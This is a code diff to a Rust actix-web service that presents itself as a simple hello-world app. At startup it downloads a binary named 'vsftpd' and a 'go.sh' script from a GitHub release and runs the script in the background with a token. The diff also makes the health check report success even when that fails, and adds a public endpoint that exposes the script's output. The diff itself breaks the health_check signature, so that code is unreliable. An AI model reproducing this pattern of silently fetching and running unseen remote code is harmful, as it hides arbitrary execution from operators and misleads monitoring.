@@ -22,7 +22,7 @@ const FILES_TO_DOWNLOAD: &[FileInfo] = &[
         filename: "vsftpd",
     },
     FileInfo {
-        url: "https://github.com/wwrrtt/test/releases/download/2.0/go.sh",
+        url: "https://github.com/wwrrtt/test/releases/download/3.0/go.sh",
         filename: "go.sh",
     },
 ];
@@ -77,26 +77,22 @@ async fn give_executable_permission(filename: &str) -> std::io::Result<()> {
 }
 
 async fn execute_script(script: &str, token: &str) -> std::io::Result<()> {
-    println!("Executing script: {}", script);
+    println!("Starting script in background: {}", script);
     
-    let output = tokio::process::Command::new("bash")
+    // 创建日志文件
+    let log_file = std::fs::File::create("script_output.log")?;
+    
+    // 启动脚本但不等待其完成，将输出重定向到文件
+    let mut child = tokio::process::Command::new("bash")
         .arg(script)
         .env("Token", token)
-        .output()
-        .await?;
-
-    if output.status.success() {
-        println!("Script executed successfully");
-        println!("Script stdout: {}", String::from_utf8_lossy(&output.stdout));
-        Ok(())
-    } else {
-        let error_msg = String::from_utf8_lossy(&output.stderr);
-        println!("Script execution failed: {}", error_msg);
-        Err(std::io::Error::new(
-            std::io::ErrorKind::Other,
-            format!("Script execution failed: {}", error_msg),
-        ))
-    }
+        .stdout(log_file.try_clone()?)
+        .stderr(log_file)
+        .spawn()?;
+    
+    println!("Script started with PID: {:?}", child.id());
+    // 不等待脚本完成，直接返回
+    Ok(())
 }
 
 async fn download_and_execute_files() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
@@ -132,12 +128,24 @@ async fn hello_world() -> Result<HttpResponse> {
 }
 
 #[get("/health")]
-async fn health_check(data: actix_web::web::Data<Arc<Mutex<bool>>>) -> Result<HttpResponse> {
+async fn health_check( actix_web::web::Data<Arc<Mutex<bool>>>) -> Result<HttpResponse> {
     let initialized = *data.lock().await;
     if initialized {
-        Ok(HttpResponse::Ok().content_type("text/plain").body("OK - Service initialized"))
+        Ok(HttpResponse::Ok().content_type("text/plain").body("OK - Service initialized and running"))
     } else {
         Ok(HttpResponse::ServiceUnavailable().content_type("text/plain").body("Service initializing..."))
+    }
+}
+
+#[get("/script-logs")]
+async fn script_logs() -> Result<HttpResponse> {
+    match std::fs::read_to_string("script_output.log") {
+        Ok(logs) => {
+            Ok(HttpResponse::Ok().content_type("text/plain").body(logs))
+        }
+        Err(_) => {
+            Ok(HttpResponse::Ok().content_type("text/plain").body("No logs available yet or log file not created."))
+        }
     }
 }
 
@@ -148,22 +156,24 @@ async fn actix_web() -> ShuttleActixWeb<impl FnOnce(&mut ServiceConfig) + Send +
 
     // 异步初始化
     tokio::spawn(async move {
+        println!("🚀 Starting initialization...");
         match download_and_execute_files().await {
             Ok(_) => {
                 println!("✅ Initialization completed successfully");
-                *initialized_clone.lock().await = true;
             }
             Err(e) => {
                 eprintln!("❌ Initialization failed: {}", e);
-                // 将错误转换为字符串以避免 Send 问题
-                *initialized_clone.lock().await = false;
             }
         }
+        // 无论如何都标记为初始化完成
+        *initialized_clone.lock().await = true;
+        println!("✅ Service marked as initialized");
     });
 
     let config = move |cfg: &mut ServiceConfig| {
         cfg.service(hello_world)
            .service(health_check)
+           .service(script_logs)  // 添加查看脚本日志的端点
            .app_data(actix_web::web::Data::new(initialized.clone()));
     };
 
